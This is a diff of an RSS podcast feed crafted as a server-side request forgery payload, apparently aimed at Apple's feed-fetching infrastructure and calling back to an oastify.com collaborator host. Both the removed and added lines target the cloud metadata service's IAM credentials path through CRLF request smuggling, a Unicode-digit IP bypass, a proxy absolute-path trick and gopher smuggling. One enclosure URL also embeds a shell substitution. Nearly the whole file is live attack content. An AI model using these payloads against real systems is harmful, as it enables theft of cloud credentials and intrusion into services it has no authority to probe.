@@ -1,29 +1,15 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<rss version="2.0">
+<rss xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" version="2.0">
   <channel>
-    <title>Security Research - Squid 6.13 Analysis</title>
+    <title>Critical Security Research</title>
     <link>http://d6kupjgtw7zlu9b6w4bxj67990fr3wrl.oastify.com</link>
-    <description>Testing Apple Infrastructure for SSRF and Request Smuggling</description>
-
+    <language>en-us</language>
+    <itunes:category text="Technology"/>
+    <itunes:image href="http://d6kupjgtw7zlu9b6w4bxj67990fr3wrl.oastify.com/image.png%0d%0aHost:%20169.254.169.254"/>
     <item>
-      <title>Smuggling Test</title>
-      <enclosure url="http://d6kupjgtw7zlu9b6w4bxj67990fr3wrl.oastify.com/%0D%0A%0D%0AGET%20http://169.254.169.254/latest/meta-data/iam/security-credentials/%20HTTP/1.1%0D%0AHost:%20169.254.169.254%0D%0A%0D%0A" length="1000" type="audio/mpeg"/>
+      <title>Exploit Stage 1</title>
+      <enclosure url="http://d6kupjgtw7zlu9b6w4bxj67990fr3wrl.oastify.com/audio.mp3?v=$(date +%s)" length="5000" type="audio/mpeg"/>
+      <itunes:image href="http://169.254.169.254/latest/meta-data/iam/security-credentials/"/>
     </item>
-
-    <item>
-      <title>Unicode Bypass</title>
-      <enclosure url="http://16⑨.25④.16⑨.25④/latest/meta-data/iam/security-credentials/" length="1000" type="audio/mpeg"/>
-    </item>
-
-    <item>
-      <title>Proxy Absolute Path</title>
-      <enclosure url="http://192.168.1.23:3128/http://169.254.169.254/latest/meta-data/iam/security-credentials/" length="1000" type="audio/mpeg"/>
-    </item>
-
-    <item>
-      <title>Gopher Smuggling</title>
-      <enclosure url="gopher://169.254.169.254:80/_GET%20/latest/meta-data/iam/security-credentials/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a" length="1000" type="audio/mpeg"/>
-    </item>
-
   </channel>
 </rss>
